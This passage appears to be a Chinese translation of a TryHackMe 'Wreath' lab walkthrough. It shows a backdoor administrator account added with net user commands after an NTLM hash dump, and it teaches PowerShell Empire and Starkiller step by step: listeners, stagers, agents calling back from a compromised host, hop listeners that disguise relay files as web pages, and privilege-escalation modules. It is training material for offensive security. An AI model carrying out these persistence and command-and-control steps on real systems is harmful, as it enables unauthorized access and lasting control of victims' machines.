+<p>在结果顶部附近，您将看到管理员的 NTLM 哈希：<br><img src="https://assets.tryhackme.com/additional/wreath-network/7e1e0a52e601.png" alt="Dumping credentials with lsadump::sam"></p>
+<p>先做一个后门账户持久性</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\GitStack\gitphp&gt; net user mikannse 1q2w3e! /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">PS C:\GitStack\gitphp&gt; net localgroup Administrators mikannse /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">PS C:\GitStack\gitphp&gt; net localgroup "Remote Management Users" mikannse /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进行一个远程桌面连接</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ xfreerdp /v:10.200.219.150 /u:mikannse /p:'1q2w3e!' +clipboard /dynamic-resolution /drive:/tmp,share</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>注意：</strong> 如果您正在使用 AttackBox，那么建议您跳到任务 32。Empire 在 AttackBox 中的安装方式并不代表推荐的方法——这是为了适应其他情况而做出的必要设计选择。如果您习惯使用 Docker（并相应地更改以下任务中的说明），请随意阅读，否则请跳至下一部分。</p>
+<hr>
+<p>那么，我们有了一个稳定的 shell，现在怎么办？</p>
+<p>立足于目标网络后，我们可以开始考虑将所谓的“C2（命令和控制）框架”发挥作用。C2 框架用于巩固攻击者在网络中的地位并简化攻击后步骤（隐私、AV 规避、旋转、抢劫、隐蔽网络策略等），以及为红队提供广泛的协作功能。最著名（且昂贵）的可能是 [Cobalt Strike](https: //<a target="_blank" rel="noopener" href="http://www.cobaltstrike.com/">www.cobaltstrike.com/</a>); 但是，还有很多其他的，包括基于 .NET 的 <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">Covenant</a>、<a target="_blank" rel="noopener" href="https://github.com/Ne0nd0g/merlin">Merlin</a>、<a target="_blank" rel="noopener" href="https://github.com/bats3c/shad0w">Shadow</a>、<a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2">PoshC2</a> 以及许多其他寻找 (和过滤）C2 框架是 <a target="_blank" rel="noopener" href="https://www.thec2matrix.com/">C2 Matrix</a>，它提供了大量框架的优缺点的列表。</p>
+<p>我们在 Windows 主机上有一个系统 shell，这是介绍我们三个教学主题中的第二个主题的理想时机：C2 框架“Empire”。</p>
+<p>顾名思义，Powershell Empire 是一个主要用于攻击 Windows 目标的框架（尽管特别是随着 dotnet core 的出现，越来越多的功能可能会在其他系统中使用），它提供了广泛的模块可供使用。初始访问设备网络，并将其变成大大的东西。在本节中，我们将研究 PS Empire 的原理，以及如何使用它（及其 GUI 界面：Starkiller）来改进我们的功能。 shell 并在 Git 服务器上执行后利用技术。</p>
+<p>Empire 项目最初于 2019 年初被放弃；但很快就被一家名为 <a target="_blank" rel="noopener" href="https://www.bc-security.org/">BC-Security</a> 的公司接手，并一直对其进行维护和改进。因此，Empire 实际上有两个公共版本 - 原始版本（现在已经非常过时）和当前的 BC-Security 分支，请小心选择正确的版本！</p>
+<p><strong>注意：</strong> 本材料最初是为 Empire 3.x 编写的，但已针对 Empire 4.x 的发布进行了更新，Empire 4.x 的操作方式非常不同，如果遵循，请确保使用 Empire 4.x。连同这些材料。</p>
+<p>我们将研究 Empire 及其 GUI 扩展：“Starkiller”是最初基于 CLI 的框架，但现在已分为<em>服务器</em>模式和<em>客户端</em>模式，这是工具箱中的最新成员。 ，并且可以用来代替（或同时）Empire 客户端 CLI 程序。</p>
+<h1 id="Empire-Installation"><a href="#Empire-Installation" class="headerlink" title="Empire: Installation"></a>Empire: Installation</h1><p>Starkiller 和 Empire（通过 Docker）都已安装在 TryHackMe AttackBox 上，因此如果您不使用自己的计算机，则可以跳过此任务。</p>
+<hr>
+<p>也就是说，如果我们使用自己的虚拟机，那么我们需要在使用它们之前安装 Empire 和 Starkiller，最终取决于您使用哪个；无论如何，我们至少需要安装 Empire。 </p>
+<p>在过去，这是一个更加复杂的过程，涉及 Git 存储库和设置脚本，现在最简单的方法是使用 apt 存储库：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt install powershell-empire starkiller</span><br></pre></td></tr></tbody></table></figure>
+
+<p>安装完两者后，我们现在需要启动 Empire 服务器，每当我们想要使用 Empire 客户端或 Starkiller 时，它都应该在后台运行：<br><code>sudo powershell-empire server</code></p>
+<p>服务器现在应该启动：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2a7488301af1.png" alt="Formatted command line output of Empire server starting"></p>
+<p>更常见的是，在单独的 C2 服务器上运行 Empire 服务器（通常在本地托管，并通过云基础设施链接回来接收入站连接），然后多个渗透测试人员或红队人员将能够连接到单个中央服务器。</p>
+<p>这对于我们在这里的使用来说完全是多余的——相反，我们将只在单个 Kali 实例上运行服务器和客户端应用程序。</p>
+<hr>
+<p>服务器启动后，让 Empire CLI 客户端开始工作，如果您想专门在 Starkiller 中工作，欢迎您跳过此步骤。</p>
+<p>启动 Empire CLI 客户端非常简单：<br><code>powershell-empire client</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png" alt="Demonstration of connecting with the Empire CLI Client"></p>
+<p>对于本地托管的服务器实例，默认情况下应该自动连接，如果 Empire 服务器位于不同的计算机上，那么您需要更改 /usr/share/powershell-empire/empire/client/config.yaml 文件中的连接信息。或使用 <code>connect HOSTNAME --username=USERNAME --password=PASSWORD</code> 从 Empire CLI 客户端手动连接。</p>
+<hr>
+<p>Starkiller 是一个 Electron 应用程序，它通过连接到 Empire 服务器公开的 REST API 来工作</p>
+<p>当 Empire 服务器运行时，我们可以通过在新的终端窗口中执行“starkiller”来启动 Starkiller：<br><img src="https://assets.tryhackme.com/additional/wreath-network/57827141bfe4.png" alt="Initial connection to Starkiller"></p>
+<p>从这里我们需要登录我们之前部署的 REST API。默认情况下，它在 <code>https://localhost:1337</code> 上运行，用户名为 <code>empireadmin</code>，密码为 <code>password123</code>：<br><img src="https://assets.tryhackme.com/additional/wreath-network/9a2bc8733ee0.png" alt="Starkiller connection with credentials (empireadmin:password123) shown"></p>
+<h1 id="Empire-Overview"><a href="#Empire-Overview" class="headerlink" title="Empire: Overview"></a>Empire: Overview</h1><p>Powershell Empire 有几个主要部分，我们将在接下来的任务中介绍。</p>
+<ul>
+<li><strong>Listeners</strong> 相当不言自明。它们监听连接并促进进一步利用</li>
+<li><strong>Stagers</strong> 本质上是 Empire 生成的有效载荷，用于与监听器一起创建强大的反向 shell。它们是代理的交付机制</li>
+<li><strong>Agents</strong> 相当于 Metasploit“会话”。它们是与受感染目标的连接，并允许攻击者进一步与系统交互</li>
+<li><strong>Modules</strong> 用于与代理结合执行进一步利用。例如，它们可以通过现有代理从服务器转储密码哈希</li>
+</ul>
+<p>Empire 还允许我们添加自定义<strong>插件</strong>，以各种方式扩展框架的功能；但是，我们不会在接下来的内容中介绍这一点。</p>
+<p>除了框架的这些实际应用之外，它还有一个漂亮的凭证存储功能，可以自动将任何找到的凭证存储在本地数据库中，以及许多其他简洁的功能！许多这些额外的功能（例如消息传递功能）都是为攻击目标的团队量身定制的；我们不会详细介绍这些协作功能，但鼓励您亲自查看它们！</p>
+<p>但是有一个问题。如前所述，我们的目标（Git 服务器）无法直接连接到我们的攻击机器。由于 Empire 处理枢转的方式，我们需要设置一种特殊的侦听器，因此在我们这样做之前，我们将学习使用已经受感染的 Web 服务器作为目标设置 Empire 和 Starkiller 的“正常”过程。一旦我们掌握了 Empire 的运作方式，我们将把重点转移到我们的主要目标：Git 服务器。</p>
+<p>在以下每个任务中，我们将介绍 Empire CLI 和 Starkiller GUI 中的相关部分。欢迎您选择您喜欢的任何一个 - 或者同时遵循这两个！</p>
+<p>让我们设置我们的第一个侦听器！</p>
+<h1 id="Empire-Listeners"><a href="#Empire-Listeners" class="headerlink" title="Empire: Listeners"></a>Empire: Listeners</h1><p>Empire 中的监听器用于接收来自 stager 的连接（我们将在下一个任务中介绍）。默认监听器是 <code>HTTP</code> 监听器。这是我们将在这里使用的，尽管还有许多其他可用的监听器。值得注意的是，单个监听器可以多次使用 - 它们不会在第一次使用后消失。</p>
+<hr>
+<p>让我们从在 Empire CLI 客户端中设置监听器开始。</p>
+<p>启动客户端后，我们会看到以下菜单：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png" alt="Demonstration of connecting with the Empire CLI Client"></p>
+<p>要选择侦听器，我们将使用“uselistener”命令。要查看所有可用的侦听器，请键入“uselistener”（确保在末尾包含空格！）——这将弹出一个可用侦听器的下拉菜单：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ecc40f11478c.png" alt="Dropdown showing the listeners available"></p>
+<p>选择侦听器后，输入“uselistener LISTENER”并按 Enter 键进行选择；或者，也可以使用向上和向下箭头键遍历下拉菜单，再次按 Enter 键选择所选侦听器。这里我们将使用“http”侦听器（最常见的类型），因此我们使用“uselistener http”：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/e79c26064a34.png" alt="Screenshot showing the options table for the selected listener"></p>
+<p>这将为侦听器带来一个巨大的选项表。如果我们需要查看此表的更新副本（例如，设置了选项），我们可以在侦听器上下文中再次使用 <code>options</code> 命令访问它。</p>
+<p>设置选项的语法与 Metasploit 模块选项语法相同——<code>set OPTION VALUE</code>。再次，在我们输入 <code>set</code> 后，将出现一个下拉列表，向我们显示可用的选项。</p>
+<p>为侦听器设置一个新名称。这使我们能够在以后轻松识别它——特别是如果我们打开了多个侦听器。但是，这不是必需的，如果愿意，可以保留默认的 <code>http</code>。</p>
+<p>也就是说，<em>必须</em>设置一些选项。至少我们必须设置主机（为我们自己的 IP 地址）和端口：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a5d0eb75224f.png" alt="Demo of setting the options for name, host and port"></p>
+<p>请记住，Empire 中的选项名称区分大小写。</p>
+<p>这里介绍的许多其他选项都非常有用，因此非常值得了解它们的作用以及如何应用它们。</p>
+<p>设置所需的选项后，我们可以使用“execute”启动侦听器。然后我们可以使用“back”退出此菜单，或使用“main”退出到主菜单。</p>
+<p>要查看我们的活动侦听器，我们可以输入 listeners 然后按 Enter：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/9e5c79b3eec7.png" alt="img"></p>
+<p>当我们想要停止监听器时，我们可以使用“kill LISTENER_NAME”来执行此操作——一个包含我们活动监听器的下拉菜单将再次出现以提供帮助。</p>
+<hr>
+<p>我们在 Empire CLI 中有一个监听器；现在让我们在 Starkiller 中做同样的事情！</p>
+<p>当我们第一次启动 Starkiller 时，我们会自动进入监听器菜单：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/d8d7fd792211.png" alt="The listeners menu of Starkiller"></p>
+<p>使用 GUI 创建监听器的过程非常直观。单击“创建”按钮。</p>
+<p>在弹出的菜单中，将类型设置为 <code>http</code>，与我们之前创建的 Empire 监听器相同。将出现几个新选项：<br><img src="https://assets.tryhackme.com/additional/wreath-network/efec537b41f2.png" alt="Available options for listeners in Starkiller"></p>
+<p>请注意，这些选项与我们之前在 CLI 版本中看到的选项相同。</p>
+<p>再次设置侦听器的名称、主机和端口（如果您已经启动了 Empire 侦听器，请确保使用与之前不同的端口！）：<br><img src="https://assets.tryhackme.com/additional/wreath-network/4ac9e0c14358.png" alt="Setting the name, host, and port options for the Starkiller listener"></p>
+<p>设置完选项后，点击页面顶部的“提交”，然后点击页面左上角的“监听器”返回监听器菜单。返回主监听器页面后，您将看到您创建的监听器！<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8d93b44295ba.png" alt="The listeners menu with the Starkiller listener started"></p>
+<p><strong>注意：</strong>如果您还在 Empire 中设置了监听器，那么这也会显示在这里。</p>
+<h1 id="Empire-Stagers"><a href="#Empire-Stagers" class="headerlink" title="Empire: Stagers"></a>Empire: Stagers</h1><p>Stagers 是 Empire 的有效载荷。它们用于连接回等待的侦听器，并在执行时创建代理。</p>
+<p>我们可以在 Empire CLI 或 Starkiller 中生成 stagers。在大多数情况下，这些将作为脚本文件提供，以便上传到目标并执行。Empire 为我们提供了创建和混淆 stagers 以规避 AV 的大量选项；但是，我们不会在这里详细介绍这些选项。</p>
+<hr>
+<p>让我们首先看看如何在 Empire CLI 应用程序中生成 stagers。</p>
+<p>在主 Empire 提示符中，键入“usestager”（包括空格！）以在下拉菜单中获取可用 stagers 的列表。</p>
+<p>这里有各种选项。如果有疑问，“multi/launcher”通常是一个不错的选择。在这种情况下，让我们选择 <code>multi/bash</code> (<code>usestager multi/bash</code>):<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ce5729866d07.png" alt="Showing the options for usestager multi/bash after selection"></p>
+<p>与监听器一样，我们使用“set OPTION VALUE”设置选项。这里有很多选项，但我们唯一需要做的就是将监听器设置为我们在上一个任务中创建的监听器的名称，然后告诉 Empire“执行”，在我们的“/tmp”目录中创建暂存器：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/3e295bf67fb9.png" alt="Setting the listener to connect to, then executing the stager"></p>
+<p>我们现在需要将 stager 发送到目标并执行，但这是以后的工作。与此同时，我们可以将 stager 保存到我们自己的攻击机器上的文件中，然后再次使用“back”退出 stager 菜单。</p>
+<hr>
+<p>不出所料，使用 Starkiller 生成 stager 的过程几乎相同。</p>
+<p>首先，我们切换到界面左侧的 Stagers 菜单：<br><img src="https://assets.tryhackme.com/additional/wreath-network/8a10ffe7d3be.png" alt="Showing the stagers menu on the left hand side of the Starkiller interface"></p>
+<p>从这里我们点击“创建”，并再次选择“multi/bash”。</p>
+<p>我们选择在上一个任务中创建的监听器，然后点击提交，其他选项保留默认值：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/15e298c934fb.png" alt="Setting the Listener name, then executing the stager"></p>
+<p>这将带我们回到 stager 主菜单，我们可以单击“操作”下拉菜单并选择“复制到剪贴板”将 stager 复制到剪贴板：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/71a9dfe8dffa.png" alt="Highlighting the button allowing us to copy the stager to the clipboard"></p>
+<p>我们现在必须再次在目标上执行此操作。</p>
+<h1 id="Empire-Agents"><a href="#Empire-Agents" class="headerlink" title="Empire: Agents"></a>Empire: Agents</h1><p>现在我们已经启动了监听器并创建了暂存器，是时候将它们组合在一起以获得代理了！</p>
+<p>我们一直在努力在受感染的 Web 服务器上获取代理，所以现在让我们开始吧。</p>
+<hr>
+<p>无论我们使用 Starkiller 还是 Empire Client，此过程都是相同的。我们需要将文件发送到目标并执行。</p>
+<p>我们可以通过多种方式做到这一点。最简单的方法是使用您喜欢的 CLI 文本编辑器在目标上创建一个文件，复制并粘贴脚本，然后执行它。如果使用此方法，请在 /tmp 目录中执行并遵循 <code>FILENAME-USERNAME.sh</code> 命名约定。我们还可以使用称为 <em><a target="_blank" rel="noopener" href="https://tldp.org/LDP/abs/html/here-docs.html">here-document</a></em> 的东西来执行整个脚本，而无需将其写入磁盘。</p>
+<p>话虽如此，这是过度的。如果我们通读脚本，我们会发现它主要分为三个部分：<br><img src="https://assets.tryhackme.com/additional/wreath-network/bed26471fb22.png" alt="Isolating the shebang, payload, and cleanup aspects of the script via highlighting. Line 1 is the shebang, line 2 is the payload, lines 3 and 4 are the cleanup."></p>
+<ul>
+<li>绿色方块中是 <em>shebang</em>。这告诉 shell 在哪个解释器下运行脚本。在这种情况下，脚本将使用 <code>/bin/bash</code> 运行</li>
+<li>红色方块包含有效负载本身。这是我们感兴趣的部分</li>
+<li>蓝色方块包含后处理命令。具体来说，这两行告诉脚本删除自身然后退出</li>
+</ul>
+<p>知道了这一点，我们可以复制红色方块中的所有内容，然后在目标上的终端中执行它：<br><img src="https://assets.tryhackme.com/additional/wreath-network/0d056c07dc42.png" alt="Demonstration of executing the payload on the target manually by copying the payload from the stager and pasting it into a shell."></p>
+<p>这会导致代理被我们等待的监听器接收。</p>
+<p>在 Empire CLI 中，接收监听器如下所示：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c40df48c20b.png" alt="Showing what a received agent looks like in Empire CLI"></p>
+<p>然后我们可以输入“agents”并按回车键来查看可用代理的完整列表：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/dd75d7655190.png" alt="Using the agents command to view all available agents"></p>
+<p>要与代理交互，我们使用“interact AGENT_NAME”——像往常一样，带有自动完成功能的下拉菜单将在这里为我们提供帮助。这会将我们带入代理的上下文中。我们可以使用“help”查看可用命令的完整列表：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/58e64472c5ae.png" alt="Demonstrating how to interact with an agent and use the help menu"></p>
+<p>请注意，此菜单将根据我们使用的 stager 而变化。</p>
+<p>当我们完成代理后，我们使用 <code>back</code> 将上下文切换回代理菜单。但是，这不会破坏代理。如果我们确实想杀死我们的代理，我们会使用 <code>kill AGENT_NAME</code> 来做到这一点：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c32ca6d0224.png" alt="Demonstrating how to exit and kill an agent using the back and kill commands"></p>
+<p>我们还可以使用命令“rename AGENT_NAME NEW_AGENT_NAME”重命名代理。</p>
+<hr>
+<p>要与 Starkiller 中的代理交互，我们转到屏幕左侧的“代理”选项卡：<br><img src="https://assets.tryhackme.com/additional/wreath-network/f72d55e49b79.png" alt="Highlighting the agents menu in Starkiller"></p>
+<p>在这里我们会看到我们的代理已经签到！<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/52199197fe7a.png" alt="Showing what an agent checking in looks like in the Starkiller GUI"></p>
+<p>要与 Starkiller 中的代理进行交互，我们可以单击其名称，也可以单击操作菜单中的“弹出”按钮。</p>
+<p>这将产生一个菜单，让我们可以访问各种令人惊叹的功能，包括执行模块（稍后会详细介绍）、在交互式 shell 中执行命令、浏览文件系统等等。在继续之前，请务必尝试一下！<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/fe886b4ba6bb.png" alt="Showing the popout menu for interacting with the received agent"></p>
+<p>要删除 Starkiller 中的特工，我们可以使用弹出特工窗口中的垃圾桶图标，或者使用 Starkiller 的特工选项卡中特工操作菜单中的杀死按钮。</p>
+<h1 id="Empire-Hop-Listeners"><a href="#Empire-Hop-Listeners" class="headerlink" title="Empire: Hop Listeners"></a>Empire: Hop Listeners</h1><p>如前所述，Empire 代理不能通过 socat 中继或任何等效重定向进行代理；但一定有一种方法可以从没有出站访问的目标中取回代理，对吗？</p>
+<p>答案是肯定的。我们使用一种称为 Hop Listener 的东西。</p>
+<p>Hop Listeners 在我们的侦听器列表中创建看起来像常规侦听器的东西（就像我们之前使用的 http 侦听器一样）；但是，跳跃侦听器不是打开端口来接收连接，而是创建文件以复制到受感染的“跳转”服务器并从那里提供服务。这些文件包含指示我们重新连接到攻击机器上的正常（通常是 HTTP）侦听器的指令。因此，侦听器菜单中的跳跃侦听器可以被视为占位符——生成阶段时使用的引用。</p>
+<p>如果现在这还不太明白，别担心！希望我们完成一个示例后，它就会明白。</p>
+<p>我们将使用的跳跃侦听器是最常见的类型：<code>http_hop</code> 侦听器。</p>
+<p>创建后，这将创建一组 <code>.php</code> 文件，必须将其上传到跳转服务器（我们被攻陷的 Web 服务器）并由 HTTP 服务器提供服务。在正常情况下，这将是一项简单的任务，因为被攻陷的服务器已经有一个正在运行的 Web 服务器；但是，出于对尝试网络的其他人的尊重，我们不会使用已安装的 Web 服务器。</p>
+<hr>
+<p>让我们首先看看如何在 Empire CLI 中启动侦听器。</p>
+<p>使用 Empire 主菜单中的 <code>uselistener http_hop</code> 切换到侦听器的上下文（您可能需要使用 <code>back</code> 几次才能退出任何代理等）。这里有几个我们感兴趣的选项：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8fff79486323.png" alt="Highlighting the options needing set for the http_hop listener: RedirectListener, Host, and Port"></p>
+<p>具体来说，我们需要：-</p>
+<ul>
+<li><strong>RedirectListener</strong>——这是一个常规侦听器，用于将任何收到的代理转发到该侦听器。将跃点侦听器视为受感染服务器上的中继；我们仍然需要用某种方式捕获它！您可以使用之前为此设置的侦听器，或者使用我们之前使用的相同步骤创建一个全新的 HTTP 侦听器。但请确保它与已经活动的侦听器的名称匹配！</li>
+<li><strong>Host</strong>——受感染 Web 服务器的 IP（<code>.200</code>）。</li>
+<li><strong>Port</strong>——这是将用于托管我们的跃点文件的 Web 服务器的端口。在这里选择一个随机端口（高于 15000），但要记住它！</li>
+</ul>
+<p>填写后，我们的选项应如下所示：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/0a85d9e55345.png" alt="Showing the full options for the hop_listener when set. Also executing the listener."></p>
+<p>如屏幕截图所示，我们再次使用“execute”启动监听器。</p>
+<p>这会将各种文件写入我们攻击机器的“/tmp”中的新“http_hop”目录中。当我们提供文件时，我们需要在我们的跳转服务器（受感染的“.200”网络服务器）上复制此文件结构。请注意，这些文件（“news.php”、“admin/get.php”和“login/process.php”）在真正的网络应用程序文件中不会显得格格不入——而且实际上可以轻松地离散地合并到现有的网络应用程序中。</p>
+<hr>
+<p>让我们看看如何在 Starkiller 中设置“http_hop”监听器。</p>
+<p>到这个阶段，您应该相当熟悉这个过程，所以我们将快速完成它。</p>
+<p>使用屏幕左侧的菜单切换回 Starkiller 中的“监听器”菜单：<br><img src="https://assets.tryhackme.com/additional/wreath-network/fed6f29eee3a.png" alt="Showing the listeners menu in Starkiller again"></p>
+<p>创建一个新的监听器并选择“http_hop”作为类型。然后我们像 Empire CLI Client 一样填写选项：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/c7a7339d03cb.png" alt="Filling in the options for the http_hop listener in Starkiller"></p>
+<p>再次，我们设置<strong>主机</strong>（<code>.200</code>）、<strong>端口</strong>和<strong>RedirectListener</strong>。</p>
+<p><strong>注意：</strong>如果您还使用 Empire CLI 设置了 Hop Listener，那么您还应该更改 OutFolder 以避免覆盖先前生成的文件。</p>
+<p>单击“提交”，监听器将启动！</p>
+<h1 id="Git-Server"><a href="#Git-Server" class="headerlink" title="Git Server"></a>Git Server</h1><p>是时候把这一切付诸实践了！</p>
+<p>您应该已经在 Empire 或 Starkiller 中启动了上一个任务中的 <code>http_hop</code> 侦听器。如果没有，请抓住这个机会在继续之前启动一个。</p>
+<p>启动侦听器后，我们必须做两件事才能从 Git 服务器取回代理：-</p>
+<ul>
+<li>我们必须为目标生成适当的暂存器</li>
+<li>我们必须将 <code>http_hop</code> 文件放到 .200 上的位置，并启动一个 Web 服务器以在侦听器创建期间选择的端口上提供文件。此服务器必须能够执行 PHP，因此 PHP 调试服务器是理想的选择</li>
+</ul>
+<hr>
+<p>让我们从生成暂存器开始。为此，我们将使用 <code>multi/launcher</code> 暂存器。我们已经在任务 26 中介绍了如何创建暂存器，因此您应该能够在相对不带指导的情况下完成此操作。这里需要设置的唯一选项是“Listener”选项，它需要设置为我们在上一个任务中创建的“http_hop”监听器的名称：</p>
+<p><strong>Empire CLI:</strong><br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/948827be57c0.png" alt="Setting the Listener option for the http_hop listener in Empire CLI Client"></p>
+<p><strong>Starkiller:</strong><br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/18461d0a00ec.png" alt="Making a multi/launcher in Starkiller"></p>
+<p>如果使用 Empire CLI，您将看到一个可复制并粘贴到目标命令行中的有效负载：<br><img src="https://assets.tryhackme.com/additional/wreath-network/597e71846d80.png" alt="Showing the payload generated by Empire CLI to be copied into the target command line"></p>
+<p>如果使用 Starkiller，您可以通过单击主 Stagers 菜单中 stager 的“操作”菜单的复制按钮将有效载荷复制到剪贴板：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/df9e3449f125.png" alt="Showing the payload generated by Starkiller"></p>
+<p>无论你选择哪种方法，请将提供的命令保存在某处，但不要立即执行。在跳转服务器上设置跳转文件后，我们将需要它。</p>
+<hr>
+<p>现在让我们设置该跳转服务器！</p>
+<p>首先，在受感染 Web 服务器的 /tmp 目录中，创建并输入一个名为 <code>hop-USERNAME</code>的目录. e.g.:<br><img src="https://assets.tryhackme.com/additional/wreath-network/d2ca11ee5470.png" alt="Creating a directory called hop-USERNAME in the /tmp directory of the compromised webserver. e.g. mkdir /tmp/hop-USERNAME, cd /tmp/hop-USERNAME"></p>
+<p>将内容从 <code>/tmp/http_hop</code>（或任何您称之为的内容）目录传输到目标服务器上的此目录。一个好方法是压缩目录的内容（<code>cd /tmp/http_hop &amp;&amp; zip -r hop.zip </code>），然后使用前面显示的方法之一传输 zip 文件。例如，使用 Python HTTP 服务器执行此操作：<br><img src="https://assets.tryhackme.com/additional/wreath-network/b3fa83178a6e.png" alt="Demonstrating transferring the zip file using a Python HTTP server, as well as how to zip the file up."></p>
+<p>然后我们可以在 Web 服务器上解压该 zip 文件 (i.e. <code>unzip hop.zip</code>):<br><img src="https://assets.tryhackme.com/additional/wreath-network/f5e072039e18.png" alt="Demonstrating unzipping the file on the target"></p>
+<p><strong>注意：</strong><code>ls</code> 的输出必须与屏幕截图匹配 - 即当前目录中应该有一个 <code>news.php</code> 文件，其中 <code>admin/</code> <em>和</em><code>login/</code> <em>作为子目录。</em></p>
+<p>我们现在需要在生成 http_hop 侦听器（任务 28）时选择的端口上实际提供文件。幸运的是，我们已经知道此服务器已安装 PHP，因为它作为主网站的后端。这意味着我们可以使用 PHP 开发网络服务器来提供我们的文件！其语法如下：<br><code>php -S 0.0.0.0:PORT &amp;&gt;/dev/null &amp;</code></p>
+<p>e.g:<br><img src="https://assets.tryhackme.com/additional/wreath-network/b46fe13b58a7.png" alt="Demonstrating the process of setting up the PHP debug server"></p>
+<p>如屏幕截图所示，Web 服务器现在正在后台监听所选端口 47000。</p>
+<p><strong>注意：</strong>如果您还没有打开防火墙中的端口，请记住打开它！</p>
+<p>当我们需要提供 PHP 文件时，这是一个方便的技巧，因为我们的标准 Python HTTP Web 服务器无法解释 PHP 语言，因此无法执行脚本。</p>
+<hr>
+<p>现在我们已经拥有了开始这项工作所需的一切！</p>
+<h1 id="Empire-Modules"><a href="#Empire-Modules" class="headerlink" title="Empire: Modules"></a>Empire: Modules</h1><p>如前所述，模块用于通过活动的 Empire 代理对受感染目标执行各种任务。例如，我们可以通过其 Empire 模块使用 Mimikatz 从目标中转储各种机密。</p>
+<p>按照惯例，让我们看看在 Empire CLI 和 Starkiller 中加载模块。</p>
+<hr>
+<p>从 Empire CLI 开始：</p>
+<p>在代理上下文中，输入“usemodule”。正如预期的那样，这将显示一个下拉列表，其中包含可加载到代理中执行的大量模块列表。</p>
+<p>这里并不重要，因为我们已经拥有对目标的完全访问权限，但为了学习，让我们尝试加载 Sherlock Empire 模块。这将检查目标上的潜在特权升级向量。<br><code>usemodule powershell/privesc/sherlock</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/081792f6213e.png" alt="Demonstration of loading the sherlock module"></p>
+<p>与之前一样，我们可以使用 <code>options</code> 在加载模块后获取有关模块的信息。</p>
+<p>此模块需要设置一个选项：<code>Agent</code> 值。这里已经为我们设置了该值；但是，如果它不正确或者尚未设置选项，则我们可以使用以下命令进行设置：<code>set Agent AGENT_NAME</code>（与框架之前部分的语法相同）。</p>
+<p>我们使用通常的 <code>execute</code> 命令启动模块。然后，模块将作为后台作业运行，并在完成后返回结果。<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8ec5020e81a2.png" alt="Executing the module in Empire CLI Client"></p>
+<p>如果我们大概知道我们想要做什么，但是不知道模块的确切路径，我们可以直接输入“usemodule NAME_OF_MODULE”，它就会出现在下拉菜单中：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/02eba19664ee.png" alt="Demonstrating searching for modules using the dropdown menu"></p>
+<hr>
+<p>现在让我们在 Starkiller 中做同样的事情。</p>
+<p>首先我们切换到模块菜单：<br><img src="https://assets.tryhackme.com/additional/wreath-network/43556845ab7b.png" alt="Showing the modules menu in Starkiller"></p>
+<p>在右上角我们可以搜索我们想要的模块。我们再来搜索一下 Sherlock 模块：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ec88bc6ff7b5.png" alt="Demonstrating the search function at the top right of the Starkiller Modules interface"></p>
+<p>单击模块名称来选择模块。</p>
+<p>从这里我们单击“代理”菜单，然后选择要使用该模块的代理：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/fc2e34bbfd15.png" alt="Demonstrating what adding an agent looks like in Starkiller"></p>
+<p>单击“提交”运行模块！</p>
+<p>要查看结果，我们需要切换到窗口左侧主菜单的“报告”部分：<br><img src="https://assets.tryhackme.com/additional/wreath-network/f8553e45f903.png" alt="Showing the reporting tab found in the left hand menu of Starkiller"></p>
+<p>从这里我们可以看到刚刚运行的任务，显示正在使用的代理、事件类型、命令、用户和时间戳。<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/f57165fc44fc.png" alt="Highlighting the down arrow used to show the task results in the reporting section"></p>
+<p>点击任务左侧的下拉箭头即可显示任务结果：<br><img src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/213d58186b7f.png" alt="Demonstration of possible task results from a finished task in Starkiller"></p>
